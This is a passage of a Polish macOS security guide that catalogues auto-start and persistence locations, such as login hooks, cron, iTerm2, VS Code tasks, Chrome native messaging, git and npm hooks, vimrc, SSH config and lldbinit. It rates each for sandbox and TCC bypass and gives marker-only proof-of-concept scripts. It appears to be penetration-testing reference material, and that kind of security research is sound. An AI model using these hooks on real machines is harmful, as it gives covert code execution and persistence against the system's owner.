Te ścieżki dotyczą starszych pakietów `.qlgenerator`; [przewodnik Apple po architekturze Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) opisuje kolejność wyszukiwania i dopasowywanie typów plików. Obecne **rozszerzenia aplikacji** Quick Look są dostarczane wraz z aplikacją i podlegają innym zasadom rejestracji oraz uruchamiania. Sama obecność generatora nie dowodzi, że zostanie wybrany dla danego typu ani że jego kod zostanie uruchomiony w samym Finderze. Ścieżkę starszego generatora sprawdzono na podstawie dokumentacji i obecności katalogu; na badanym Macu nie zainstalowano ani nie załadowano żadnego generatora.

### ~~Hooki logowania/wylogowania~~

> [!CAUTION]
> U mnie to nie zadziałało — ani z LoginHook użytkownika, ani z LogoutHook roota.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz mieć możliwość wykonania polecenia takiego jak `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`cated w `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale można ich użyć do wykonywania poleceń, gdy użytkownik się loguje.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

To ustawienie jest przechowywane w pliku `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Aby go usunąć:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Wpis dla użytkownika root jest przechowywany w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Warunkowy sandbox bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje autostartu przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **założenie występowania niezbyt typowych warunków**, takich jak zainstalowane konkretne **programy, „nietypowe” działania użytkownika** lub środowiska.

### Cron

**Opis**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Przydatne do sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak mieć możliwość wykonania pliku binarnego `crontab`
  - Albo być rootem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/usr/lib/cron/tabs/`**
  - Bezpośredni dostęp do zapisu wymaga uprawnień roota. Nie są one wymagane, jeśli możesz wykonać `crontab <file>`
  - **Wyzwalacz**: Harmonogram zainstalowanego crontaba. `at` i `periodic` to opisane poniżej osobne mechanizmy.

#### Opis i wykorzystanie

Wyświetl zadania cron **bieżącego użytkownika** za pomocą:

```bash
crontab -l
```

Plik plist launchd systemowego demona cron zawiera wpis `QueueDirectories` wskazujący na `/usr/lib/cron/tabs`; tam przechowywane są zainstalowane crontaby użytkowników. Do sprawdzania crontabów innych użytkowników wymagane są uprawnienia root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Na jednorazowym koncie można zainstalować wpis cron użytkownika zawierający wyłącznie znacznik za pomocą `crontab`, a po jego zaobserwowaniu usunąć go. Uruchomienie `crontab <file>` **zastępuje całą istniejącą crontabę konta**, więc jeśli konto nie jest jednorazowe, zapisz ją i przywróć:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Opis: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Przydatne do omijania sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 miał wcześniej przyznane uprawnienia TCC

#### Lokalizacje

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Wyzwalacz**: Uruchom iTerm2 z odpowiednim skryptem Python API w tym folderze
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Wyzwalacz**: Uruchom iTerm2; hook startowy AppleScript jest opisany osobno
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Wyzwalacz**: Utwórz sesję z profilem, którego polecenie lub tekst początkowy wywołuje payload

#### Opis i wykorzystanie

[Obecny przewodnik iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) opisuje automatycznie uruchamiane skrypty **Python** w `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Nie potwierdza, że dowolny plik wykonywalny `.sh` w tym folderze zostanie uruchomiony. Na jednorazowym koncie zapisz poniższy plik jako `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[aktualny przewodnik AppleScript dla iTerm2](https://iterm2.com/documentation-scripting.html) opisuje osobno `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, z użyciem starszej ścieżki `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` jako alternatywy, gdy nowoczesny folder nie istnieje. Przykładowy AppleScript zawierający wyłącznie znacznik to:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Te przykłady skryptów sprawdzono na podstawie dokumentacji iTerm2, ale nie uruchamiano ich w aktywnej sesji pulpitu. Po przetestowaniu na koncie tymczasowym usuń skrypt testowy oraz odpowiednio `/tmp/ht-iterm-autolaunch-marker` lub `/tmp/iterm2-autolaunchscpt`.

Preferencje iTerm2 znajdujące się w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą określać polecenie profilu lub tekst początkowy. Ten drugi jest wpisywany w sesji; jego wykonanie zależy od tego, czy interpretuje go powłoka. [Dokumentacja profili iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) opisuje polecenie uruchamiane po utworzeniu nowej sesji z tym profilem.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Polecenie jest widoczne w preferencjach:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

For bezpiecznej oceny sprawdź wybrany profil w ustawieniach iTerm2 lub odczytaj kopię jego pliku preferencji. Zmiana `Initial Text` w aktywnym profilu wpłynęłaby na sesje użytkownika, dlatego na Macu używanym do badań nie zmieniono żadnych preferencji.

### xbar

Opis: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak zainstalowanego xbar
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Żąda uprawnień Accessibility

#### Lokalizacja

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Wyzwalacz**: Po uruchomieniu xbar

#### Opis

Jeśli popularny program [**xbar**](https://github.com/matryer/xbar) jest zainstalowany, można napisać skrypt powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie uruchomiony przy starcie xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Hammerspoon musi być jednak zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Accessibility

#### Lokalizacja

- **`~/.hammerspoon/init.lua`**
  - **Wyzwalacz**: Po uruchomieniu Hammerspoon

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) to platforma automatyzacji dla **macOS**, która wykorzystuje **język skryptowy LUA**. Umożliwia również integrację pełnego kodu AppleScript i wykonywanie skryptów powłoki, co znacznie rozszerza jej możliwości skryptowe.<sup>[[13]](#references)</sup>

Aplikacja wyszukuje jeden plik: `~/.hammerspoon/init.lua`. Po uruchomieniu wykonywany jest skrypt.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - BetterTouchTool musi być jednak zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Aplikacja prosi o uprawnienia Automation-Shortcuts i Accessibility

#### Lokalizacja

- Plik skryptu **już wskazywany** przez włączony preset BetterTouchTool albo konfiguracja tego presetu w `~/Library/Application Support/BetterTouchTool/`. Dokładna ścieżka skryptu zależy od konfiguracji presetu.

[Dokumentacja akcji BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) opisuje akcje skryptów powłoki i poleceń działających w tle. Skonfigurowane zdarzenie klawiatury, myszy, touch, widgetu lub inne musi wystąpić, gdy odpowiedni preset jest aktywny; [przewodnik po wyzwalaczach](https://docs.folivora.ai/docs/configuration/new-trigger/) opisuje to powiązanie. Dowolny plik w katalogu application-support nie jest wyzwalaczem. Skonfigurowana wcześniej akcja, która wczytuje zewnętrzny, zapisywalny skrypt, jest bardziej konkretnym celem typu zapis-do-wykonania. Kod działa na koncie użytkownika BetterTouchTool, z uwzględnieniem faktycznie przyznanych uprawnień macOS. BetterTouchTool nie było zainstalowane w `/Applications` na Macu badawczym, więc lokalnie nie zmieniono ani nie uruchomiono żadnego presetu.

### Alfred

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Alfred musi być jednak zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Aplikacja prosi o uprawnienia Automation, Accessibility, a nawet Full-Disk access

#### Lokalizacja

- Skrypt lub plik **już wskazywany** przez zainstalowany workflow Alfreda albo ten workflow w skonfigurowanym przez użytkownika katalogu `Alfred.alfredpreferences`. Katalog preferencji może być synchronizowany i nie ma jednej uniwersalnej ścieżki.

[Przewodnik po workflowach Alfreda](https://www.alfredapp.com/help/workflows/) opisuje wymóg posiadania Powerpack i instalację przez interfejs użytkownika. Musi zadziałać skonfigurowany wyzwalacz zainstalowanego workflow, taki jak hotkey, keyword lub inny; [przykład hotkeya Alfreda](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) pokazuje akcję skryptu. [Dokumentacja zmiennych środowiskowych Alfreda](https://www.alfredapp.com/help/workflows/script-environment-variables/) udostępnia wybraną ścieżkę preferencji jako `alfred_preferences`. Umieszczenie niezarejestrowanego pliku workflow w dowolnym katalogu nie dowodzi, że workflow zostanie zainstalowany lub uruchomiony. Kod działa jako zalogowany użytkownik Alfreda, z uwzględnieniem faktycznie przyznanych uprawnień macOS. Alfred nie był zainstalowany w `/Applications` na Macu badawczym, więc tę ścieżkę oceniono wyłącznie na podstawie dokumentacji.

### Raycast Script Commands i odświeżanie rozszerzeń

- **Cel zapisu:** Wykonywalny skrypt w katalogu **już dodanym** w Raycast Settings → Script Commands. Raycast nie skanuje dowolnego nowo utworzonego katalogu. [Przewodnik Raycast po Script Commands](https://manual.raycast.com/script-commands) opisuje rejestrację katalogu.
- **Wyzwalacz i tożsamość:** Użytkownik uruchamia zindeksowane polecenie, skonfigurowany hotkey lub fallback uruchamia je albo Raycast odświeża skrypt `inline` zgodnie z ustawieniem `@raycast.refreshTime`. Skrypt działa jako zalogowany użytkownik Raycast za pośrednictwem interpretera. [Dokumentacja metadanych](https://github.com/raycast/script-commands#metadata) ogranicza automatyczne odświeżanie do poleceń inline, a [manifest rozszerzeń Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) osobno obsługuje `interval` dla zainstalowanych poleceń rozszerzeń typu `no-view` lub `menu-bar`. Samo dodanie zwykłego polecenia skryptu nie zaplanuje jego uruchamiania.

Na potrzeby jednorazowego konta z zarejestrowanym katalogiem skryptów można użyć skryptu inline, który zapisuje wyłącznie znacznik:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Zapisz go w zarejestrowanym katalogu, nadaj mu uprawnienia do wykonywania i pozwól Raycastowi odświeżyć dane. Następnie usuń ten plik oraz `/tmp/ht-raycast-refresh-marker`. Raycasta nie znaleziono na komputerze Mac używanym do badań pod jego zwyczajową nazwą w `/Applications`, dlatego opis jest oparty na dokumentacji i nie został lokalnie uruchomiony. Dostępność, Automatyzacja i uprawnienia do plików nadal zależą od monitów macOS o przyznanie uprawnień.

### Automatyczne zadania obszaru roboczego w Visual Studio Code

- **Plik docelowy:** `.vscode/tasks.json` w obszarze roboczym, który użytkownik otworzy.
- **Wyzwalacz:** Otwarcie tego obszaru roboczego w VS Code, ale tylko wtedy, gdy folder jest zaufany **i** zezwolono na automatyczne zadania. W niezaufanym obszarze roboczym automatyczne zadania nigdy nie są uruchamiane; domyślnie przed pierwszym automatycznym uruchomieniem użytkownik jest proszony o zgodę. [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) i [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) opisują oba te warunki.
- **Tożsamość wykonania:** Konto użytkownika VS Code, za pośrednictwem skonfigurowanego procesu zadania. Jest to wykonywanie specyficzne dla aplikacji, a nie mechanizm utrzymywania dostępu po zalogowaniu.

W **nowym, tymczasowym obszarze roboczym** umieść w `.vscode/tasks.json` to zadanie, które tworzy wyłącznie plik znacznikowy:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Po otwarciu zaufanego obszaru roboczego i zezwoleniu na automatyczne zadania sprawdź, czy istnieje plik `.autostart-task-ran`. Usuń wpis zadania i znacznik, aby posprzątać. **Zostało to zweryfikowane na podstawie dokumentacji Microsoftu i zainstalowanego pakietu VS Code 1.139.1; nie uruchomiono tego w aktywnej sesji pulpitu.**

### Chrome native messaging hosts

- **Miejsce zapisu:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` dla bieżącego użytkownika lub `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` dla wszystkich użytkowników (wymagane uprawnienia administratora do zapisu). Chromium i Chrome for Testing używają różnych katalogów; zobacz [aktualną tabelę ścieżek Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Wyzwalacz:** Zainstalowane rozszerzenie Chrome z uprawnieniem `nativeMessaging` wywołuje `chrome.runtime.connectNative()` lub `chrome.runtime.sendNativeMessage()` z dokładną nazwą hosta z manifestu. Chrome uruchamia wtedy plik wykonywalny hosta. Samo otwarcie Chrome nie uruchamia dowolnego nowego hosta natywnego; utworzenie manifestu bez rozszerzenia, które go wywoła, nic nie robi. [Przewodnik Chrome dotyczący native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) opisuje ten proces.
- **Tożsamość wykonania:** konto użytkownika Chrome. Manifest musi podawać bezwzględną ścieżkę do pliku wykonywalnego i jawnie zezwalać na pochodzenie wywołującego rozszerzenia.

W odizolowanym koncie przeglądarki z testowym rozszerzeniem poniższa para plików demonstruje powiązanie między zapisem a wykonaniem. Nazwa pliku manifestu musi być zgodna z jego wartością `name`, a `TEST_EXTENSION_ID` należy zastąpić rzeczywistym identyfikatorem tego rozszerzenia:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Zapisz ten JSON jako `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Plik wykonywalny służący wyłącznie jako znacznik, wskazany w polu `path` manifestu, może zawierać:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Po tym, jak testowe rozszerzenie wywoła `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` ze swojego service workera lub strony rozszerzenia, znacznik potwierdzi, że host został uruchomiony. Ten minimalny host nie implementuje protokołu odpowiedzi Chrome z prefiksem długości, więc po zapisaniu znacznika rozszerzenie może zgłosić błąd komunikacji. Usuń testowy manifest, hosta i znacznik. W systemie macOS 26.5.2 aplikacja Chrome oraz oba katalogi manifestów były obecne; **aktywny profil Chrome nie został zmodyfikowany ani użyty do testów**.

### Polecenia zdarzeń klawiszy Karabiner-Elements

- **Miejsce zapisu:** `~/.config/karabiner/karabiner.json` na koncie, na którym zainstalowano i uruchomiono Karabiner-Elements. [Przewodnik Karabiner dotyczący lokalizacji plików](https://karabiner-elements.pqrs.org/docs/json/location/) informuje, że aplikacja obserwuje ten plik i wczytuje go ponownie po zapisie. Pliki JSON w `assets/complex_modifications` to jedynie presety, które można zaimportować; sam zapis pliku w tym miejscu nie włącza reguły.
- **Wyzwalacz:** Skonfigurowane zdarzenie klawisza po aktywowaniu reguły. Dokumentacja [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) opisuje wykonywanie poleceń. Nie oznacza to wykonywania kodu przy logowaniu ani po każdym zapisie pliku.
- **Tożsamość wykonująca:** Zalogowany użytkownik, w którego imieniu działa proces użytkownika Karabiner. Przyznane mu uprawnienia oraz dostęp TCC zależą od aplikacji i jej wersji.

Na jednorazowym koncie testowym dodaj ten obiekt reguły do tablicy `complex_modifications.rules` wybranego profilu w `karabiner.json`, zachowując pozostałą zawartość profilu. Naciśnij F18, aby utworzyć nieszkodliwy znacznik, a następnie usuń tę regułę i znacznik. F18 nie zastępuje zwykłego klawisza używanego do pisania:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements nie był zainstalowany w `/Applications` na maszynie testowej z macOS 26.5.2, więc jest to PoC oparty na dokumentacji, a nie wynik lokalnego uruchomienia.

### Git hooks w lokalnym repozytorium

- **Cel zapisu:** wykonywalny hook, taki jak `<repo>/.git/hooks/post-checkout`. Jeśli `core.hooksPath` został już ustawiony, użyj skonfigurowanego katalogu. Hook zatwierdzony jako zwykły śledzony plik źródłowy nie jest automatycznie instalowany w klonie.
- **Wyzwalacz:** odpowiadająca mu operacja Git. Na przykład `post-checkout` uruchamia się po `git checkout` lub `git switch`, a także po utworzeniu klonu lub worktree. [Dokumentacja hooków Git](https://git-scm.com/docs/githooks) zawiera listę zdarzeń i wymóg ustawienia bitu wykonywalności; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) zmienia katalog wyszukiwania.

- **Tożsamość wykonująca:** konto uruchamiające Git. Hook może zostać wykonany tylko wtedy, gdy użytkownik ma uprawnienia do zapisu w efektywnym katalogu hooków repozytorium i później wykona odpowiednią operację Git.

Ten PoC ograniczony do utworzenia znacznika tworzy całkowicie tymczasowe repozytorium, instaluje jeden hook i przełącza gałąź. Został pomyślnie uruchomiony w Apple Git 2.50.1 na macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Skrypty cyklu życia npm w projekcie

- **Cel zapisu:** Mapa `scripts` w pliku `package.json` projektu z prawem zapisu albo w pakiecie zainstalowanej zależności, którego skrypt cyklu życia uruchomi użytkownik. To element przepływu pracy deweloperskiej, a nie mechanizm wykonywany po otwarciu katalogu.
- **Wyzwalacz i tożsamość:** Późniejsze `npm install` lub `npm ci`, jeśli skrypty cyklu życia są dozwolone, uruchamiają `preinstall`, `install` i `postinstall` jako użytkownik wywołujący npm. Zwykłe `npm run <name>` uruchamia również pasujące skrypty `pre<name>` i `post<name>`. [npm's lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) zawiera listę zdarzeń; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) może wyłączyć skrypty cyklu życia instalacji. Ustawienia wersji i zasad mogą zmieniać to, co jest dozwolone, dlatego sprawdź wersję npm w środowisku docelowym.

To PoC, które jedynie tworzy znacznik, uruchomiono przy użyciu lokalnego npm w pustym, przeznaczonym do testów katalogu. Nie pobiera zależności ani nie modyfikuje projektu użytkownika:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Różni się to od plików startowych interpretera Python: npm musi wykonać odpowiednią akcję instalacji lub uruchomienia, podczas gdy kod `site` w Pythonie może zostać załadowany przy zwykłym uruchomieniu interpretera. Podobnie ogólne cele `Makefile` i definicje zadań kompilacji wymagają, aby użytkownik lub skonfigurowane wcześniej narzędzie wywołało dany cel; nie są to odrębne ścieżki autostartu systemu operacyjnego.

### Konfiguracja startowa Vim

- **Cel zapisu:** `~/.vimrc` użytkownika, który uruchomi Vim (lub inny plik startowy wybrany zgodnie z kolejnością inicjalizacji Vim). [Dokumentacja startowa Vim](https://vimhelp.org/starting.txt.html) opisuje ten plik oraz nadpisania `VIMINIT`/`EXINIT`.
- **Wyzwalacz:** Kolejne zwykłe uruchomienie Vim, które wczytuje tę konfigurację. Opcja `-u NONE` pomija vimrc użytkownika. Jest to wykonanie specyficzne dla edytora, a nie wyzwalacz logowania do systemu operacyjnego.
- **Tożsamość wykonania:** Konto użytkownika Vim.

Poniższy odizolowany PoC uruchomiono na `/usr/bin/vim` z macOS; nie zapisuje on żadnych rzeczywistych ustawień Vim ani otwartych dokumentów:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ma oddzielną ścieżkę konfiguracji użytkownika: `$XDG_CONFIG_HOME/nvim/init.lua` lub `init.vim`. Zgodnie z [dokumentacją uruchamiania](https://neovim.io/doc/user/starting/) ładuje też skrypty z katalogów runtime `plugin/`. Neovim nie był zainstalowany na maszynie testowej z macOS 26.5.2, więc nie uruchomiono tam tego wariantu.

### Polecenia konfiguracji klienta SSH

- **Docelowy plik zapisu:** `~/.ssh/config` lub inny plik, który jest już dołączany. To plik konfiguracji **klienta**; jest oddzielny od pliku serwerowego `~/.ssh/rc` opisanego poniżej.
- **Wyzwalacz:** Pasujące wywołanie `ssh`. `Match exec` uruchamia lokalne polecenie podczas odczytywania przez klienta konfiguracji, nawet przy `ssh -G`, które wyświetla konfigurację bez łączenia się. `ProxyCommand` uruchamia się, gdy klient ustanawia pasujące połączenie. `LocalCommand` uruchamia się dopiero po pomyślnym nawiązaniu połączenia i wymaga `PermitLocalCommand yes` (domyślnie jest to `no`). Te dyrektywy różnią się momentem wykonania i wymaganiami; sam zapis nie powoduje ich wykonania. Zobacz dokumentację upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Tożsamość wykonania:** Lokalny użytkownik uruchamiający `ssh`. Wymagane są pasujący host, obowiązujący plik konfiguracji i — jeśli to konieczne — połączenie. `ssh -F` pozwala wybrać inny plik konfiguracji.

Ten PoC, który jedynie tworzy znacznik, został uruchomiony z użyciem klienta SSH firmy Apple w macOS 26.5.2. `-G` sprawdza działanie `Match exec` bez nawiązywania połączenia sieciowego i bez odczytywania rzeczywistej konfiguracji SSH użytkownika:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Pliki inicjalizacyjne debuggera

- **Cel zapisu:** `~/.lldbinit` lub plik aplikacji o wyższym priorytecie, taki jak `~/.lldbinit-lldb`. LLDB odczytuje jeden plik podczas uruchamiania debuggera. Plik `.lldbinit` w bieżącym katalogu **nie** jest domyślnie wykonywany; użytkownik musi włączyć `target.load-cwd-lldbinit` lub przekazać `--local-lldbinit`. Zobacz [podręcznik LLDB](https://lldb.llvm.org/man/lldb.html).
- **Wyzwalacz i tożsamość:** Użytkownik uruchamia LLDB bez `--no-lldbinit`; polecenia są wykonywane jako ten użytkownik. Samo otwarcie projektu nie oznacza, że zostanie uruchomiony plik `.lldbinit` projektu.

Poniższy test zapisujący wyłącznie znacznik przeprowadzono w LLDB na macOS 26.5.2, z odizolowanym katalogiem domowym i katalogiem roboczym:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB** dokumentacja uruchamiania [projektu upstream](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) wymienia na macOS najpierw `$HOME/Library/Preferences/gdb/gdbinit`, a następnie `~/.gdbinit`. Plik `.gdbinit` w bieżącym katalogu podlega regule [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), a opcje `-nx`/`-nh` wyłączają pliki inicjalizacyjne. GDB nie był zainstalowany na testowym Macu, więc tego wariantu nie uruchomiono lokalnie.

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak włączenia i używania ssh
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Użycie SSH w celu uzyskania dostępu FDA

#### Lokalizacja

- **`~/.ssh/rc`**
  - **Wyzwalacz**: Logowanie przez ssh
- **`/etc/ssh/sshrc`**
  - Wymagany root
  - **Wyzwalacz**: Logowanie przez ssh

> [!CAUTION]
> Włączenie ssh wymaga Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i wykorzystanie

Domyślnie, o ile w `/etc/ssh/sshd_config` nie ustawiono `PermitUserRC no`, po **zalogowaniu użytkownika przez SSH** zostaną wykonane skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Elementy logowania**

Opis: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak uruchomić `osascript` z argumentami
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **Zarejestrowana aplikacja pomocnicza elementu logowania:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (częsta lokalizacja w pakiecie aplikacji).
  - **Wyzwalacz:** Rejestracja może natychmiast uruchomić aplikację pomocniczą; będzie ona też uruchamiana przy kolejnych logowaniach użytkownika, zależnie od zatwierdzenia.
- **Zarejestrowany agent/daemon w pakiecie:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` lub `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Wyzwalacz:** Zatwierdzony agent może zostać uruchomiony podczas rejestracji i przy kolejnych logowaniach; zatwierdzony daemon uruchamia się podczas rozruchu. Daemon wymaga zatwierdzenia przez administratora.

#### Opis

